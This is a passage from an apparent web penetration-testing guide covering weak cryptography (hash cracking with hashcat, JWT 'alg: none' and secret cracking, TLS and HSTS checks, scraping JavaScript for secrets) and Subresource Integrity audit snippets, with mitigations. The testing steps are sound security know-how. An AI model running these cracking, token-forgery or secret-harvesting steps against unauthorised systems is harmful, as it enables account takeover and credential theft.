+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check for HTTP endpoints returning sensitive data</span>
+</span></span><span style="display:flex;"><span>curl -I &lt;http://target.com/api/login&gt;    <span style="color:#75715e"># Should redirect to HTTPS, not serve content</span>
+</span></span><span style="display:flex;"><span>curl -I &lt;https://target.com&gt; | grep -i <span style="color:#e6db74">&#34;strict-transport&#34;</span>   <span style="color:#75715e"># Should contain HSTS header</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Confirm HSTS is present and well-configured</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Good:    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Missing: No header = HTTP downgrade possible</span>
+</span></span></code></pre></div><h3 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Action</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Weak password hash</td>
+<td>Extract hash; run hashcat with rockyou</td>
+<td>MD5/SHA-1 hash cracks in seconds</td>
+</tr>
+<tr>
+<td>JWT <code>alg: none</code></td>
+<td>Set header alg to none, empty signature</td>
+<td>Server accepts unsigned token</td>
+</tr>
+<tr>
+<td>JWT weak secret</td>
+<td>Run hashcat <code>-m 16500</code> against token</td>
+<td>Secret recovered; arbitrary tokens forgeable</td>
+</tr>
+<tr>
+<td>TLS weak protocol</td>
+<td>Run <a href="http://testssl.sh/" target="_blank" rel="noreferrer noopener nofollow">testssl.sh</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> <code>--protocols</code></td>
+<td>SSLv3 / TLS 1.0 enabled = reportable</td>
+</tr>
+<tr>
+<td>AES-ECB</td>
+<td>Submit 48 identical bytes to encrypt endpoint</td>
+<td>Repeated ciphertext blocks in response</td>
+</tr>
+<tr>
+<td>Hardcoded key</td>
+<td>Grep JS/source files for key/secret patterns</td>
+<td>Credentials found in plaintext</td>
+</tr>
+<tr>
+<td>Missing HSTS</td>
+<td><code>curl -I &lt;https://target.com</code>&gt;</td>
+<td>No <code>Strict-Transport-Security</code> header</td>
+</tr>
+<tr>
+<td>HTTP login</td>
+<td>Submit credentials over HTTP</td>
+<td>Credentials visible in plaintext in traffic</td>
+</tr>
+<tr>
+<td>Weak randomness / entropy</td>
+<td>Generate multiple reset tokens, OTPs, session IDs, or API keys and compare them</td>
+<td>Tokens should be unique, unpredictable, sufficiently long, and should not follow any visible pattern</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-techniques-offensive-perspective">
+  Detection Techniques (Offensive Perspective)
+  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
+</h2>
+<h3 id="manual-detection">
+  Manual Detection
+  <a class="anchor" href="#manual-detection">#</a>
+</h3>
+<p><strong>Identify hash algorithm from leaked data</strong></p>
+<pre tabindex="0"><code>Length 32 hex  → MD5        (fast to crack, look for rainbow tables)
+Length 40 hex  → SHA-1      (fast to crack)
+Length 64 hex  → SHA-256    (check if salted — if not, still fast)
+$2y$10$...     → bcrypt     (slow — deprioritise)
+$argon2...     → Argon2     (secure — skip)
+</code></pre><p><strong>Inspect JWT without a tool</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Decode header and payload manually (no verification)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># {&#34;alg&#34;:&#34;HS256&#34;,&#34;typ&#34;:&#34;JWT&#34;}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># HS256 = shared secret = brute-forceable</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RS256 = asymmetric = try algorithm confusion instead</span>
+</span></span></code></pre></div><p><strong>Check TLS certificate strength</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect target.com:443 2&gt;/dev/null | openssl x509 -noout -text <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | grep -E <span style="color:#e6db74">&#34;(Signature Algorithm|Public-Key|Not After)&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SHA1withRSA or key &lt; 2048 = reportable</span>
+</span></span></code></pre></div><h3 id="automated-detection">
+  Automated Detection
+  <a class="anchor" href="#automated-detection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Full TLS audit in one command</span>
+</span></span><span style="display:flex;"><span>testssl.sh --full --jsonfile results.json target.com:443
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scan for exposed secrets across a JS-heavy app</span>
+</span></span><span style="display:flex;"><span>gospider -s &lt;https://target.com&gt; -d <span style="color:#ae81ff">2</span> -q | grep -oP <span style="color:#e6db74">&#39;https?://[^ ]+\.js&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | xargs -I<span style="color:#f92672">{}</span> curl -s <span style="color:#f92672">{}</span> | grep -E <span style="color:#e6db74">&#34;(apiKey|secret|password|token)\s*[:=]\s*[\&#34;&#39;][^\&#34;&#39;]{8,}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nuclei — crypto-related templates</span>
+</span></span><span style="display:flex;"><span>nuclei -u &lt;https://target.com&gt; -t ssl/ -t exposures/tokens/
+</span></span></code></pre></div><h2 id="impact-1">
+  Impact
+  <a class="anchor" href="#impact-1">#</a>
+</h2>
+<ul>
+<li><strong>Credential Theft:</strong> Weak hashes cracked offline expose plaintext passwords usable for credential stuffing or account takeover</li>
+<li><strong>Authentication Bypass:</strong> JWT <code>alg: none</code> or unverified signatures allow privilege escalation without valid credentials</li>
+<li><strong>Data Decryption:</strong> Intercepted traffic or stolen ciphertext decrypted due to weak algorithms or ECB mode</li>
+<li><strong>Key Compromise:</strong> Hardcoded or weak keys give permanent access until explicitly rotated</li>
+<li><strong>Traffic Interception:</strong> HTTP or TLS downgrade allows passive or active MITM against sensitive sessions</li>
+<li><strong>Compliance Breach:</strong> PCI-DSS, HIPAA, GDPR all mandate strong encryption; failures directly trigger audit findings</li>
+</ul>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>hashcat</td>
+<td>GPU-accelerated hash and JWT secret cracking</td>
+</tr>
+<tr>
+<td>john the ripper</td>
+<td>CPU-based hash cracking</td>
+</tr>
+<tr>
+<td><a href="http://testssl.sh/" target="_blank" rel="noreferrer noopener nofollow">testssl.sh</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+<td>Comprehensive TLS protocol, cipher, and vulnerability audit</td>
+</tr>
+<tr>
+<td>sslscan</td>
+<td>Quick TLS cipher enumeration</td>
+</tr>
+<tr>
+<td>jwt_tool</td>
+<td>JWT decode, tamper, crack, and attack automation</td>
+</tr>
+<tr>
+<td>Burp JWT Editor</td>
+<td>In-Repeater JWT modification and attack payloads</td>
+</tr>
+<tr>
+<td>truffleHog / gitleaks</td>
+<td>Entropy-based secret scanning in source and git history</td>
+</tr>
+<tr>
+<td>nuclei</td>
+<td>Template-based crypto misconfiguration detection</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation--prevention">
+  Mitigation &amp; Prevention
+  <a class="anchor" href="#mitigation--prevention">#</a>
+</h2>
+<ol>
+<li><strong>Password Hashing:</strong> Use bcrypt, Argon2, or scrypt with a per-user salt; never MD5, SHA-1, or unsalted SHA-256 for passwords</li>
+<li><strong>Authenticated Encryption:</strong> Use AES-GCM or ChaCha20-Poly1305; never AES-ECB; always use a random IV per operation</li>
+<li><strong>TLS Configuration:</strong> Enforce TLS 1.2+ (TLS 1.3 preferred); disable SSLv3, TLS 1.0/1.1; remove RC4, 3DES, EXPORT cipher suites; enable HSTS</li>
+<li><strong>JWT Security:</strong> Explicitly allowlist the algorithm server-side; never trust <code>alg</code> from the token; reject <code>none</code>; use RS256/ES256 over HS256 for multi-service environments; enforce strong secrets (32+ random bytes)</li>
+<li><strong>Key Management:</strong> Never hardcode secrets; use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault); rotate keys regularly</li>
+<li><strong>No Custom Cryptography:</strong> Use well-audited libraries (<code>libsodium</code>, <code>cryptography</code> Python package, Java <code>javax.crypto</code> with current providers); never implement algorithms from scratch</li>
+<li><strong>Enforce HTTPS Everywhere:</strong> Redirect all HTTP to HTTPS; set <code>Strict-Transport-Security</code> with <code>max-age</code> ≥ 1 year and <code>includeSubDomains</code></li>
+<li><strong>Secure Randomness:</strong> Use cryptographically secure random number generators for tokens, OTPs, session IDs, CSRF tokens, IVs, nonces, and API keys. Avoid <code>Math.random()</code>, <code>rand()</code>, timestamp-based values, sequential IDs, or user-derived values for security-sensitive token generation.</li>
+</ol>
+<hr>
+<h2 id="software-integrity---sri-presence-validation">
+  Software Integrity - SRI Presence Validation
+  <a class="anchor" href="#software-integrity---sri-presence-validation">#</a>
+</h2>
+<p>Subresource Integrity, also known as SRI, helps the browser verify that third-party scripts and stylesheets have not been tampered with. If an application loads JavaScript or CSS from a CDN or third-party domain without SRI, an attacker who compromises the CDN, third-party provider, or network path may inject malicious code into the application.</p>
+<p>The following browser console snippets can be used to check whether SRI is present and whether the SRI-related attributes are configured correctly.</p>
+<h3 id="check-all-scripts-and-their-sri-status">
+  Check All Scripts and Their SRI Status
+  <a class="anchor" href="#check-all-scripts-and-their-sri-status">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#34;script[src]&#34;</span>)].<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">script</span> =&gt; ({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">hasIntegrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">integrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">hasCrossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>),
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>)
+</span></span><span style="display:flex;"><span>}));
+</span></span></code></pre></div><h3 id="list-only-scripts-missing-sri">
+  List Only Scripts Missing SRI
+  <a class="anchor" href="#list-only-scripts-missing-sri">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#34;script[src]&#34;</span>)]
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">script</span> =&gt; <span style="color:#f92672">!</span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>))
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">script</span> =&gt; <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>);
+</span></span></code></pre></div><h3 id="list-only-external-scripts-missing-sri">
+  List Only External Scripts Missing SRI
+  <a class="anchor" href="#list-only-external-scripts-missing-sri">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#34;script[src]&#34;</span>)]
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">script</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>);
+</span></span><span style="display:flex;"><span>  })
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">script</span> =&gt; <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>);
+</span></span></code></pre></div><h3 id="check-stylesheets-missing-sri">
+  Check Stylesheets Missing SRI
+  <a class="anchor" href="#check-stylesheets-missing-sri">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;link[rel=&#34;stylesheet&#34;][href]&#39;</span>)]
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">link</span> =&gt; <span style="color:#f92672">!</span><span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>))
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">link</span> =&gt; <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>);
+</span></span></code></pre></div><h3 id="check-external-stylesheets-missing-sri">
+  Check External Stylesheets Missing SRI
+  <a class="anchor" href="#check-external-stylesheets-missing-sri">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;link[rel=&#34;stylesheet&#34;][href]&#39;</span>)]
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">link</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>);
+</span></span><span style="display:flex;"><span>  })
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">link</span> =&gt; <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>);
+</span></span></code></pre></div><h3 id="full-sri-audit-for-scripts-and-stylesheets">
+  Full SRI Audit for Scripts and Stylesheets
+  <a class="anchor" href="#full-sri-audit-for-scripts-and-stylesheets">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>(() =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">scripts</span> <span style="color:#f92672">=</span> [...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#34;script[src]&#34;</span>)].<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">script</span> =&gt; ({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;script&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">external</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>).<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hasIntegrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">integrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hasCrossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>)
+</span></span><span style="display:flex;"><span>  }));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stylesheets</span> <span style="color:#f92672">=</span> [...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;link[rel=&#34;stylesheet&#34;][href]&#39;</span>)].<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">link</span> =&gt; ({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;stylesheet&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">external</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>).<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hasIntegrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">integrity</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hasCrossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;crossorigin&#34;</span>)
+</span></span><span style="display:flex;"><span>  }));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> [...<span style="color:#a6e22e">scripts</span>, ...<span style="color:#a6e22e">stylesheets</span>];
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><h3 id="show-only-external-resources-missing-sri">
+  Show Only External Resources Missing SRI
+  <a class="anchor" href="#show-only-external-resources-missing-sri">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>(() =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">scripts</span> <span style="color:#f92672">=</span> [...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#34;script[src]&#34;</span>)]
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">script</span> =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>);
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">script</span> =&gt; ({
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;script&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span>
+</span></span><span style="display:flex;"><span>    }));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stylesheets</span> <span style="color:#f92672">=</span> [...document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;link[rel=&#34;stylesheet&#34;][href]&#39;</span>)]
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">link</span> =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">hasAttribute</span>(<span style="color:#e6db74">&#34;integrity&#34;</span>);
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">link</span> =&gt; ({
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;stylesheet&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">href</span>
+</span></span><span style="display:flex;"><span>    }));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> [...<span style="color:#a6e22e">scripts</span>, ...<span style="color:#a6e22e">stylesheets</span>];
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><h3 id="sri-script-validation-status">
+  SRI Script Validation Status
+  <a class="anchor" href="#sri-script-validation-status">#</a>
+</h3>
+<p>The SRI snippets have been reviewed for browser console execution and are syntactically valid.</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Querying scripts using <code>document.querySelectorAll(&quot;script[src]&quot;)</code></td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Checking presence of <code>integrity</code> attribute</td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Checking presence of <code>crossorigin</code> attribute</td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Filtering external scripts using <code>new URL(script.src).origin !== location.origin</code></td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Listing scripts missing SRI</td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Checking stylesheets for SRI</td>
+<td>Working</td>
+</tr>
+<tr>
+<td>Full script and stylesheet SRI audit snippet</td>
+<td>Working</td>
+</tr>
+</tbody>
+</table>
+<h3 id="important-notes">
+  Important Notes
+  <a class="anchor" href="#important-notes">#</a>
+</h3>
+<ul>
+<li>SRI is mainly required for external scripts and stylesheets loaded from CDN or third-party domains.</li>
+<li>Same-origin scripts may not always require SRI, but adding SRI can still improve integrity assurance.</li>
+<li>For cross-origin resources, the <code>crossorigin</code> attribute is usually required with SRI.</li>
+<li>If the external script or stylesheet changes, the SRI hash must also be updated.</li>
+<li>If the SRI hash is incorrect, the browser will block the script or stylesheet from loading.</li>
+</ul>
+<h3 id="example-secure-script-tag">
+  Example Secure Script Tag
+  <a class="anchor" href="#example-secure-script-tag">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;https://cdn.example.com/library.min.js&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha384-BASE64_HASH_VALUE&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h3 id="example-secure-stylesheet-tag">
+  Example Secure Stylesheet Tag
+  <a class="anchor" href="#example-secure-stylesheet-tag">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;https://cdn.example.com/library.min.css&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha384-BASE64_HASH_VALUE&#34;</span>
